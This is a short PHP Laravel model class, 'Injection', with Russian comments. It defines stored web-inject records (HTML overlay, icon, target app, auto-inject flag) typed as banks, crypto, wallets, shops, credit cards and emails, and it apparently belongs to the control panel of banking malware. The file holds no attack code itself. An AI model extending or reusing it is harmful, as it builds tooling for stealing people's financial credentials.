<?php

namespace App\Models;

use Eloquent;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\HasOne;

/**
 * App\Models\Injection
 *
 * @property int $id
 * @property string $application Приложение
 * @property string $name Название инжекта для панели
 * @property string $html Относительный путь к html
 * @property string $image Относительный путь к иконке
 * @property string $type Доступные варианты: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails'
 * @property int $auto Флаг определяющий автоинжект.
 * @property-read \App\Models\InjectionFile|null $files
 * @method static \Illuminate\Database\Eloquent\Builder|Injection newModelQuery()
 * @method static \Illuminate\Database\Eloquent\Builder|Injection newQuery()
 * @method static \Illuminate\Database\Eloquent\Builder|Injection query()
 * @method static \Illuminate\Database\Eloquent\Builder|Injection whereApplication($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Injection whereAuto($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Injection whereHtml($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Injection whereId($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Injection whereImage($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Injection whereName($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Injection whereType($value)
 * @mixin Eloquent
 */
class Injection extends Model
{
    public $timestamps = false;

    protected $fillable = [
        'application',
        'image',
        'html',
        'name',
        'type',
        'auto',
    ];

    protected $casts = [
        'auto' => 'boolean',
    ];

    protected $hidden = [
        'laravel_through_key'
    ];

    public function files(): HasOne
    {
        return $this->hasOne(InjectionFile::class, 'injection_id', 'id');
    }
}
